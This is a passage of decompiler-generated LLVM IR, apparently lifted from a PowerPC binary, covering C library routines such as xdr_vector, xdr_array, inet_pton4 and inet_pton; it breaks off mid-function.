  store i32 ptrtoint (i32* @global_var_10013fc0.494 to i32), i32* @lr, align 4
  %v3_10013fbc = call i32 @clnt_perror(i32 %v0_10013fb4, i32 ptrtoint ([24 x i8]* @global_var_100174e0.493 to i32))
  store i32 0, i32* %stack_var_-84, align 4
  %v0_10013fc8.pre = load i32, i32* @r29, align 4
  %v1_10013fc8 = add i32 %v0_10013fc8.pre, 4
  %v2_10013fc8 = inttoptr i32 %v1_10013fc8 to i32*
  %v3_10013fc8 = load i32, i32* %v2_10013fc8, align 4
  %v1_10013fd0 = add i32 %v3_10013fc8, 16
  %v2_10013fd0 = inttoptr i32 %v1_10013fd0 to i32*
  %v3_10013fd0 = load i32, i32* %v2_10013fd0, align 4
  call void @__pseudo_call(i32 %v3_10013fd0)
  %v3_10013fdc = load i32, i32* %stack_var_-84, align 4
  br label %dec_label_pc_10013fe8

dec_label_pc_10013fe8:                            ; preds = %entry, %dec_label_pc_10013f2c, %dec_label_pc_10013fc8
  %storemerge = phi i32 [ %v3_10013fdc, %dec_label_pc_10013fc8 ], [ 0, %dec_label_pc_10013f2c ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32 60, { 2, 3, 12, 13, 4, 1, 6, 14, 9, 7, 8, 16, 17, 15, 20, 21, 19, 18, 10, 11, 0, 5 }
  uselistorder i32 (i32, i32, i32)* @__GI_clntudp_bufcreate, { 2, 0, 1, 3 }
  uselistorder i32 100000, { 1, 2, 0 }
  uselistorder i32* @r9, { 15, 34, 37, 45, 32, 16, 33, 38, 0, 73, 55, 56, 35, 36, 14, 46, 47, 48, 3, 12, 57, 65, 66, 1, 39, 67, 30, 17, 19, 18, 4, 68, 69, 8, 71, 58, 59, 9, 10, 60, 11, 20, 5, 6, 21, 22, 23, 24, 25, 26, 13, 40, 41, 42, 43, 44, 51, 54, 2, 72, 61, 62, 7, 63, 64, 52, 53, 27, 28, 49, 50, 70, 29, 31 }
  uselistorder i32 400, { 3, 4, 8, 9, 0, 6, 7, 1, 2, 5 }
  uselistorder i32 (i32)* @__get_myaddress, { 1, 0 }
  uselistorder label %dec_label_pc_10013fe8, { 2, 1, 0 }
}

define i32 @_rpc_dtablesize() local_unnamed_addr {
entry:
  %v0_10014004 = load i32, i32* @r31, align 4
  %v3_10014010 = load i32, i32* @global_var_1002c3f0.495, align 4
  %v3_10014014 = icmp eq i32 %v3_10014010, 0
  br i1 %v3_10014014, label %dec_label_pc_1001401c, label %dec_label_pc_10014024

dec_label_pc_1001401c:                            ; preds = %entry
  store i32 268517408, i32* @lr, align 4
  %v0_1001401c = call i32 @getdtablesize()
  store i32 %v0_1001401c, i32* @global_var_1002c3f0.495, align 4
  br label %dec_label_pc_10014024

dec_label_pc_10014024:                            ; preds = %entry, %dec_label_pc_1001401c
  %v3_10014028 = phi i32 [ %v3_10014010, %entry ], [ %v0_1001401c, %dec_label_pc_1001401c ]
  store i32 %v0_10014004, i32* @r31, align 4
  ret i32 %v3_10014028

; uselistorder directives
  uselistorder label %dec_label_pc_10014024, { 1, 0 }
}

define i32 @xdr_vector(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r27.global-to-local, align 4
  store i32 %arg4, i32* %r28.global-to-local, align 4
  store i32 %arg5, i32* %r29.global-to-local, align 4
  %v2_1001407c9 = icmp eq i32 %arg3, 0
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v2_1001408c11 = add i32 %arg2, %arg4
  store i32 %v2_1001408c11, i32* %r31.global-to-local, align 4
  store i32 1, i32* %r30.global-to-local, align 4
  br i1 %v2_1001407c9, label %dec_label_pc_10014098, label %dec_label_pc_10014068

dec_label_pc_10014068:                            ; preds = %entry, %dec_label_pc_10014068.dec_label_pc_1001407c_crit_edge.dec_label_pc_10014068_crit_edge
  %v0_10014068 = phi i32 [ %v0_10014068.pre, %dec_label_pc_10014068.dec_label_pc_1001407c_crit_edge.dec_label_pc_10014068_crit_edge ], [ %arg5, %entry ]
  call void @__pseudo_call(i32 %v0_10014068)
  %v0_10014074 = load i32, i32* %r3.global-to-local, align 4
  %v3_10014074 = icmp eq i32 %v0_10014074, 0
  br i1 %v3_10014074, label %dec_label_pc_1001409c, label %dec_label_pc_10014068.dec_label_pc_1001407c_crit_edge

dec_label_pc_10014068.dec_label_pc_1001407c_crit_edge: ; preds = %dec_label_pc_10014068
  %v0_1001407c.pre = load i32, i32* %r30.global-to-local, align 4
  %v1_1001407c.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_10014080.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10014084.pre = load i32, i32* %r26.global-to-local, align 4
  %v1_1001408c.pre = load i32, i32* %r28.global-to-local, align 4
  %v2_1001407c = icmp ult i32 %v0_1001407c.pre, %v1_1001407c.pre
  store i32 %v0_10014084.pre, i32* %r3.global-to-local, align 4
  %v2_1001408c = add i32 %v0_10014080.pre, %v1_1001408c.pre
  store i32 %v2_1001408c, i32* %r31.global-to-local, align 4
  %v1_10014090 = add i32 %v0_1001407c.pre, 1
  store i32 %v1_10014090, i32* %r30.global-to-local, align 4
  br i1 %v2_1001407c, label %dec_label_pc_10014068.dec_label_pc_1001407c_crit_edge.dec_label_pc_10014068_crit_edge, label %dec_label_pc_10014098

dec_label_pc_10014068.dec_label_pc_1001407c_crit_edge.dec_label_pc_10014068_crit_edge: ; preds = %dec_label_pc_10014068.dec_label_pc_1001407c_crit_edge
  %v0_10014068.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10014068

dec_label_pc_10014098:                            ; preds = %entry, %dec_label_pc_10014068.dec_label_pc_1001407c_crit_edge
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001409c

dec_label_pc_1001409c:                            ; preds = %dec_label_pc_10014068, %dec_label_pc_10014098
  %v0_100140ac = phi i32 [ 1, %dec_label_pc_10014098 ], [ 0, %dec_label_pc_10014068 ]
  ret i32 %v0_100140ac

; uselistorder directives
  uselistorder i32 %v0_1001407c.pre, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r30.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_1001409c, { 1, 0 }
  uselistorder label %dec_label_pc_10014098, { 1, 0 }
  uselistorder label %dec_label_pc_10014068, { 1, 0 }
}

define i32 @__GI_xdr_array(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg6, i32* @r8, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r28, align 4
  store i32 %arg5, i32* %r25.global-to-local, align 4
  store i32 %arg6, i32* %r24.global-to-local, align 4
  store i32 %tmp, i32* @r27, align 4
  %v1_100140dc = inttoptr i32 %arg2 to i32*
  %v2_100140dc = load i32, i32* %v1_100140dc, align 4
  store i32 %v2_100140dc, i32* @r31, align 4
  store i32 268517604, i32* @lr, align 4
  %v2_100140e0 = inttoptr i32 %arg3 to i32*
  %v4_100140e0 = call i32 @xdr_u_int(i32* %v2_100140e0, i32* %v2_100140e0)
  store i32 %v4_100140e0, i32* %r3.global-to-local, align 4
  %v3_100140e4 = icmp eq i32 %v4_100140e0, 0
  br i1 %v3_100140e4, label %dec_label_pc_100141dc, label %dec_label_pc_100140ec

dec_label_pc_100140ec:                            ; preds = %entry
  %v0_100140ec = load i32, i32* %r30.global-to-local, align 4
  %v1_100140ec = inttoptr i32 %v0_100140ec to i32*
  %v2_100140ec = load i32, i32* %v1_100140ec, align 4
  store i32 %v2_100140ec, i32* @r29, align 4
  %v1_100140f0 = load i32, i32* @r28, align 4
  %v3_100140f0 = icmp ugt i32 %v2_100140ec, %v1_100140f0
  br i1 %v3_100140f0, label %dec_label_pc_10014108, label %dec_label_pc_100140f8

dec_label_pc_100140f8:                            ; preds = %dec_label_pc_100140ec
  %v1_100140fc = load i32, i32* %r25.global-to-local, align 4
  %v2_100140fc = udiv i32 -1, %v1_100140fc
  %v3_10014100 = icmp ugt i32 %v2_100140ec, %v2_100140fc
  br i1 %v3_10014100, label %dec_label_pc_10014108, label %dec_label_pc_10014114

dec_label_pc_10014108:                            ; preds = %dec_label_pc_100140f8, %dec_label_pc_100140ec
  %v0_10014108 = load i32, i32* @r27, align 4
  %v1_10014108 = inttoptr i32 %v0_10014108 to i32*
  %v2_10014108 = load i32, i32* %v1_10014108, align 4
  %v3_1001410c = icmp eq i32 %v2_10014108, 2
  br i1 %v3_1001410c, label %dec_label_pc_10014114, label %dec_label_pc_100141dc

dec_label_pc_10014114:                            ; preds = %dec_label_pc_10014108, %dec_label_pc_100140f8
  %v0_10014114 = load i32, i32* @r31, align 4
  %v3_10014114 = icmp eq i32 %v0_10014114, 0
  br i1 %v3_10014114, label %dec_label_pc_1001411c, label %dec_label_pc_1001417c

dec_label_pc_1001411c:                            ; preds = %dec_label_pc_10014114
  %v0_1001411c = load i32, i32* @r27, align 4
  %v1_1001411c = inttoptr i32 %v0_1001411c to i32*
  %v2_1001411c = load i32, i32* %v1_1001411c, align 4
  %v3_10014120 = icmp eq i32 %v2_1001411c, 1
  br i1 %v3_10014120, label %dec_label_pc_10014134, label %dec_label_pc_10014128

dec_label_pc_10014128:                            ; preds = %dec_label_pc_1001411c
  %v3_10014128 = icmp eq i32 %v2_1001411c, 2
  br i1 %v3_10014128, label %dec_label_pc_100141e4, label %dec_label_pc_1001417c

dec_label_pc_10014134:                            ; preds = %dec_label_pc_1001411c
  %v3_10014134 = icmp eq i32 %v2_100140ec, 0
  br i1 %v3_10014134, label %dec_label_pc_100141e4, label %dec_label_pc_1001413c

dec_label_pc_1001413c:                            ; preds = %dec_label_pc_10014134
  %v1_1001413c = load i32, i32* %r25.global-to-local, align 4
  %v2_1001413c = mul i32 %v1_1001413c, %v2_100140ec
  store i32 %v2_1001413c, i32* @r30, align 4
  store i32 %v2_1001413c, i32* @r3, align 4
  store i32 268517704, i32* @lr, align 4
  %v0_10014144 = call i32 @malloc()
  store i32 %v0_10014144, i32* %r3.global-to-local, align 4
  %v3_10014148 = icmp eq i32 %v0_10014144, 0
  store i32 %v0_10014144, i32* @r31, align 4
  %v1_10014150 = load i32, i32* @r26, align 4
  %v2_10014150 = inttoptr i32 %v1_10014150 to i32*
  store i32 %v0_10014144, i32* %v2_10014150, align 4
  br i1 %v3_10014148, label %dec_label_pc_10014158, label %dec_label_pc_10014170

dec_label_pc_10014158:                            ; preds = %dec_label_pc_1001413c
  %v3_10014160 = load i32, i32* @global_var_1002c2b0, align 4
  store i32 ptrtoint ([26 x i8]* @global_var_10017508.496 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001416c.497 to i32), i32* @lr, align 4
  %v3_10014168 = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_10017508.496 to i32), i32 %v3_10014160)
  store i32 %v3_10014168, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100141dc

dec_label_pc_10014170:                            ; preds = %dec_label_pc_1001413c
  %v0_10014170 = load i32, i32* @r30, align 4
  store i32 268517756, i32* @lr, align 4
  %v3_10014178 = call i32 @__GI_memset(i32 0, i32 %v0_10014170, i32 %v0_10014170)
  store i32 %v3_10014178, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001417c

dec_label_pc_1001417c:                            ; preds = %dec_label_pc_10014128, %dec_label_pc_10014114, %dec_label_pc_10014170
  br label %dec_label_pc_10014198

dec_label_pc_10014188:                            ; preds = %dec_label_pc_10014198
  %v0_10014188 = load i32, i32* %r24.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_10014188)
  %v0_10014194 = load i32, i32* %r3.global-to-local, align 4
  %v0_10014198.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10014198

dec_label_pc_10014198:                            ; preds = %dec_label_pc_1001417c, %dec_label_pc_10014188
  %v0_100141b0 = phi i32 [ 0, %dec_label_pc_1001417c ], [ %v0_10014198.pre, %dec_label_pc_10014188 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_1001417c ], [ %v0_10014194, %dec_label_pc_10014188 ]
  store i32 %storemerge, i32* @r30, align 4
  %v1_10014198 = load i32, i32* @r29, align 4
  %v0_1001419c = load i32, i32* @r31, align 4
  %v0_100141a0 = load i32, i32* @r27, align 4
  store i32 %v0_100141a0, i32* %r3.global-to-local, align 4
  %v3_100141a8 = icmp eq i32 %storemerge, 0
  %v1_100141ac = load i32, i32* %r25.global-to-local, align 4
  %v2_100141ac = add i32 %v1_100141ac, %v0_1001419c
  store i32 %v2_100141ac, i32* @r31, align 4
  %v1_100141b0 = add i32 %v0_100141b0, 1
  store i32 %v1_100141b0, i32* @r28, align 4
  %.not = icmp uge i32 %v0_100141b0, %v1_10014198
  %brmerge = or i1 %v3_100141a8, %.not
  br i1 %brmerge, label %dec_label_pc_100141bc, label %dec_label_pc_10014188

dec_label_pc_100141bc:                            ; preds = %dec_label_pc_10014198
  %v1_100141bc = inttoptr i32 %v0_100141a0 to i32*
  %v2_100141bc = load i32, i32* %v1_100141bc, align 4
  %v3_100141c0 = icmp eq i32 %v2_100141bc, 2
  br i1 %v3_100141c0, label %dec_label_pc_100141c8, label %dec_label_pc_100141e8

dec_label_pc_100141c8:                            ; preds = %dec_label_pc_100141bc
  %v0_100141c8 = load i32, i32* @r26, align 4
  %v1_100141c8 = inttoptr i32 %v0_100141c8 to i32*
  %v2_100141c8 = load i32, i32* %v1_100141c8, align 4
  store i32 %v2_100141c8, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100141d0.498 to i32), i32* @lr, align 4
  %v0_100141cc = call i32 @free()
  store i32 %v0_100141cc, i32* %r3.global-to-local, align 4
  %v1_100141d4 = load i32, i32* @r26, align 4
  %v2_100141d4 = inttoptr i32 %v1_100141d4 to i32*
  store i32 0, i32* %v2_100141d4, align 4
  %v0_100141ec.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100141e8

dec_label_pc_100141dc:                            ; preds = %dec_label_pc_10014108, %entry, %dec_label_pc_10014158
  store i32 0, i32* @r30, align 4
  br label %dec_label_pc_100141e8

dec_label_pc_100141e4:                            ; preds = %dec_label_pc_10014128, %dec_label_pc_10014134
  store i32 1, i32* @r30, align 4
  br label %dec_label_pc_100141e8

dec_label_pc_100141e8:                            ; preds = %dec_label_pc_100141bc, %dec_label_pc_100141dc, %dec_label_pc_100141c8, %dec_label_pc_100141e4
  %v0_100141ec = phi i32 [ %storemerge, %dec_label_pc_100141bc ], [ 0, %dec_label_pc_100141dc ], [ %v0_100141ec.pre, %dec_label_pc_100141c8 ], [ 1, %dec_label_pc_100141e4 ]
  store i32 %v0_100141ec, i32* %r3.global-to-local, align 4
  ret i32 %v0_100141ec

; uselistorder directives
  uselistorder i32 %v0_100141ec, { 1, 0 }
  uselistorder i32 %v0_10014144, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 (i32*, i32*)* @xdr_u_int, { 4, 3, 2, 0, 1, 5 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100141e8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100141e4, { 1, 0 }
  uselistorder label %dec_label_pc_100141dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014198, { 1, 0 }
  uselistorder label %dec_label_pc_1001417c, { 2, 0, 1 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %cr1_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10014200 = load i32, i32* @lr, align 4
  store i32 %v0_10014200, i32* %r0.global-to-local, align 4
  %v0_10014208 = call i32 @__asm_mfcr()
  store i32 %v0_10014208, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 0, i32* @r10, align 4
  %v2_10014214 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10014214, i32* @r7, align 4
  %v0_10014218 = load i32, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10014280

dec_label_pc_10014230:                            ; preds = %dec_label_pc_10014280
  %v3_10014230 = icmp eq i32 %v0_100142a4, 4
  store i1 %v3_10014230, i1* %cr7_eq.global-to-local, align 1
  %v0_10014234 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_10014234, label %dec_label_pc_1001426c, label %dec_label_pc_10014238

dec_label_pc_10014238:                            ; preds = %dec_label_pc_10014230
  %v0_10014238 = load i32, i32* @r7, align 4
  %v1_10014238 = inttoptr i32 %v0_10014238 to i8*
  %v2_10014238 = load i8, i8* %v1_10014238, align 1
  %v3_10014238 = zext i8 %v2_10014238 to i32
  %v1_1001423c = mul nuw nsw i32 %v3_10014238, 10
  %v1_10014240 = load i32, i32* %r11.global-to-local, align 4
  %v2_10014240 = add i32 %v1_1001423c, %v1_10014240
  %v1_10014244 = add i32 %v2_10014240, -48
  store i32 %v1_10014244, i32* %r0.global-to-local, align 4
  %v2_10014248 = icmp ugt i32 %v1_10014244, 255
  %v3_10014248 = icmp eq i32 %v1_10014244, 255
  store i1 %v3_10014248, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10014248, label %dec_label_pc_100142c8, label %dec_label_pc_10014250

dec_label_pc_10014250:                            ; preds = %dec_label_pc_10014238
  %v1_10014250 = trunc i32 %v1_10014244 to i8
  store i8 %v1_10014250, i8* %v1_10014238, align 1
  %v0_10014254 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10014254, label %dec_label_pc_10014258, label %dec_label_pc_10014280.backedge

dec_label_pc_10014258:                            ; preds = %dec_label_pc_10014250
  %v0_10014258 = load i32, i32* @r10, align 4
  %v1_10014258 = add i32 %v0_10014258, 1
  store i32 %v1_10014258, i32* @r10, align 4
  store i32 1, i32* @r8, align 4
  %v2_10014260 = icmp sgt i32 %v1_10014258, 4
  %v3_10014260 = icmp eq i32 %v1_10014258, 4
  store i1 %v3_10014260, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10014260, label %dec_label_pc_100142c8, label %dec_label_pc_10014280.backedge

dec_label_pc_1001426c:                            ; preds = %dec_label_pc_10014230
  store i32 0, i32* @r8, align 4
  %v0_10014270 = load i1, i1* %cr1_eq.global-to-local, align 1
  %v0_10014270.not = xor i1 %v0_10014270, true
  %v0_10014274 = load i1, i1* %cr4_eq.global-to-local, align 1
  %brmerge = or i1 %v3_10014230, %v0_10014274
  %or.cond = or i1 %brmerge, %v0_10014270.not
  br i1 %or.cond, label %dec_label_pc_100142c8, label %dec_label_pc_1001427c

dec_label_pc_1001427c:                            ; preds = %dec_label_pc_1001426c
  %v0_1001427c = load i32, i32* %r6.global-to-local, align 4
  %v1_1001427c = trunc i32 %v0_1001427c to i8
  %v2_1001427c = load i32, i32* @r7, align 4
  %v3_1001427c = add i32 %v2_1001427c, 1
  %v4_1001427c = inttoptr i32 %v3_1001427c to i8*
  store i8 %v1_1001427c, i8* %v4_1001427c, align 1
  store i32 %v3_1001427c, i32* @r7, align 4
  br label %dec_label_pc_10014280.backedge

dec_label_pc_10014280.backedge:                   ; preds = %dec_label_pc_1001427c, %dec_label_pc_10014250, %dec_label_pc_10014258
  %v0_10014280.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10014284.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_10014280

dec_label_pc_10014280:                            ; preds = %dec_label_pc_10014280.backedge, %entry
  %v0_10014284 = phi i32 [ %v0_10014284.pre, %dec_label_pc_10014280.backedge ], [ 0, %entry ]
  %v0_10014288 = phi i32 [ %v0_10014280.pre, %dec_label_pc_10014280.backedge ], [ %v0_10014208, %entry ]
  %v1_10014280 = inttoptr i32 %v0_10014288 to i8*
  %v2_10014280 = load i8, i8* %v1_10014280, align 1
  %v3_10014280 = zext i8 %v2_10014280 to i32
  store i32 %v3_10014280, i32* %r11.global-to-local, align 4
  %v3_10014284 = icmp eq i32 %v0_10014284, 0
  store i1 %v3_10014284, i1* %cr4_eq.global-to-local, align 1
  %v1_10014288 = add i32 %v0_10014288, 1
  store i32 %v1_10014288, i32* %r3.global-to-local, align 4
  %v3_1001428c = icmp eq i8 %v2_10014280, 0
  store i1 %v3_1001428c, i1* %cr7_eq.global-to-local, align 1
  %v1_10014290 = add nsw i32 %v3_10014280, -48
  store i32 %v1_10014290, i32* %r0.global-to-local, align 4
  %v2_10014294 = icmp ugt i32 %v1_10014290, 9
  store i1 %v2_10014294, i1* %cr6_gt.global-to-local, align 1
  %v3_10014298 = icmp eq i8 %v2_10014280, 46
  store i1 %v3_10014298, i1* %cr1_eq.global-to-local, align 1
  %v0_1001429c = load i4, i4* @cr4, align 1
  %v1_1001429c = call %3 @__asm_mcrf_cr0_write(i4 %v0_1001429c)
  %v4_1001429c = extractvalue %3 %v1_1001429c, 2
  store i1 %v4_1001429c, i1* %cr0_eq.global-to-local, align 1
  %v0_100142a0 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v0_100142a4 = load i32, i32* @r10, align 4
  br i1 %v0_100142a0, label %dec_label_pc_100142a4, label %dec_label_pc_10014230

dec_label_pc_100142a4:                            ; preds = %dec_label_pc_10014280
  %v3_100142a4 = icmp eq i32 %v0_100142a4, 3
  store i1 %v3_100142a4, i1* %cr7_eq.global-to-local, align 1
  %tmp9 = icmp slt i32 %v0_100142a4, 4
  br i1 %tmp9, label %dec_label_pc_100142c8, label %dec_label_pc_100142ac

dec_label_pc_100142ac:                            ; preds = %dec_label_pc_100142a4
  store i32 %arg1, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  store i32 %v2_10014214, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100142bc.499 to i32), i32* @lr, align 4
  %v0_100142b8 = call i32 @memcpy()
  br label %dec_label_pc_100142c8

dec_label_pc_100142c8:                            ; preds = %dec_label_pc_1001426c, %dec_label_pc_10014238, %dec_label_pc_10014258, %dec_label_pc_100142a4, %dec_label_pc_100142ac
  %storemerge = phi i32 [ 1, %dec_label_pc_100142ac ], [ 0, %dec_label_pc_100142a4 ], [ 0, %dec_label_pc_10014258 ], [ 0, %dec_label_pc_10014238 ], [ 0, %dec_label_pc_1001426c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i32 %v0_10014218, i32* %r0.global-to-local, align 4
  %v1_100142d8 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10014208)
  %v4_100142d8 = extractvalue %0 %v1_100142d8, 2
  store i1 %v4_100142d8, i1* %cr0_eq.global-to-local, align 1
  %v9_100142d8 = extractvalue %0 %v1_100142d8, 7
  store i4 %v9_100142d8, i4* @cr4, align 1
  %v0_100142dc = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100142dc

; uselistorder directives
  uselistorder i32 %v1_10014258, { 1, 0, 2 }
  uselistorder i32 %v1_10014244, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10014208, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder i1* %cr6_gt.global-to-local, { 1, 0 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr1_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 2, 1 }
  uselistorder i32 255, { 7, 8, 2, 9, 3, 4, 0, 6, 5, 1 }
  uselistorder label %dec_label_pc_100142c8, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10014280.backedge, { 0, 2, 1 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_100142e0 = icmp eq i32 %arg1, 2
  %v0_100142e4 = load i32, i32* @lr, align 4
  store i32 %v0_100142e4, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r22, align 4
  br i1 %v3_100142e0, label %dec_label_pc_1001430c, label %dec_label_pc_10014300

dec_label_pc_10014300:                            ; preds = %entry
  %v3_10014300 = icmp eq i32 %arg1, 10
  br i1 %v3_10014300, label %dec_label_pc_10014320, label %dec_label_pc_100144bc

dec_label_pc_1001430c:                            ; preds = %entry
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268518168, i32* @lr, align 4
  %v3_10014314 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  store i32 %v3_10014314, i32* %r3.global-to-local, align 4
  store i32 %v3_10014314, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100144d4

dec_label_pc_10014320:                            ; preds = %dec_label_pc_10014300
  %v2_10014320 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10014320, i32* %r3.global-to-local, align 4
  store i32 268518192, i32* @lr, align 4
  %v3_1001432c = call i32 @__GI_memset(i32 %v2_10014320, i32 0, i32 16)
  store i32 %v3_1001432c, i32* %r3.global-to-local, align 4
  %v0_10014330 = load i32, i32* @r29, align 4
  %v1_10014330 = inttoptr i32 %v0_10014330 to i8*
  %v2_10014330 = load i8, i8* %v1_10014330, align 1
  %v3_10014330 = zext i8 %v2_10014330 to i32
  store i32 %v3_10014330, i32* %r0.global-to-local, align 4
  store i32 %v3_1001432c, i32* @r31, align 4
  %v2_10014338 = add i32 %v3_1001432c, 16
  store i32 %v2_10014338, i32* @r27, align 4
  %v3_1001433c = icmp eq i8 %v2_10014330, 58
  br i1 %v3_1001433c, label %dec_label_pc_10014344, label %dec_label_pc_10014350

dec_label_pc_10014344:                            ; preds = %dec_label_pc_10014320
  %v1_10014344 = add i32 %v0_10014330, 1
  %v2_10014344 = inttoptr i32 %v1_10014344 to i8*
  %v3_10014344 = load i8, i8* %v2_10014344, align 1
  %v4_10014344 = zext i8 %v3_10014344 to i32
  store i32 %v4_10014344, i32* %r0.global-to-local, align 4
  store i32 %v1_10014344, i32* @r29, align 4
  %v3_10014348 = icmp eq i8 %v3_10014344, 58
  br i1 %v3_10014348, label %dec_label_pc_10014350, label %dec_label_pc_100144d0

dec_label_pc_10014350:                            ; preds = %dec_label_pc_10014344, %dec_label_pc_10014320
  %v0_10014350 = phi i32 [ %v1_10014344, %dec_label_pc_10014344 ], [ %v0_10014330, %dec_label_pc_10014320 ]
  store i32 %v0_10014350, i32* @r26, align 4
  store i32 0, i32* @r24, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_100144243036 = inttoptr i32 %v0_10014350 to i8*
  %v2_100144243137 = load i8, i8* %v1_100144243036, align 1
  %v3_100144243238 = zext i8 %v2_100144243137 to i32
  store i32 %v3_100144243238, i32* %r3.global-to-local, align 4
  store i32 268518444, i32* @lr, align 4
  %v1_100144283339 = call i32 @__GI_tolower(i32 %v3_100144243238)
  store i32 %v1_100144283339, i32* %r3.global-to-local, align 4
  store i32 %v1_100144283339, i32* @r30, align 4
  %v3_1001442c3440 = icmp eq i32 %v1_100144283339, 0
  br i1 %v3_1001442c3440, label %dec_label_pc_10014434, label %dec_label_pc_1001435c.lr.ph

dec_label_pc_1001435c:                            ; preds = %dec_label_pc_1001435c.lr.ph, %dec_label_pc_10014424.backedge
  %v1_1001442835 = phi i32 [ %v1_100144283341, %dec_label_pc_1001435c.lr.ph ], [ %v1_10014428, %dec_label_pc_10014424.backedge ]
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_10017538.500 to i32), i32* @r25, align 4
  %v0_10014368 = load i32, i32* @r29, align 4
  %v1_10014368 = add i32 %v0_10014368, 1
  store i32 %v1_10014368, i32* @r29, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_10017538.500 to i32), i32* @r3, align 4
  store i32 268518260, i32* @lr, align 4
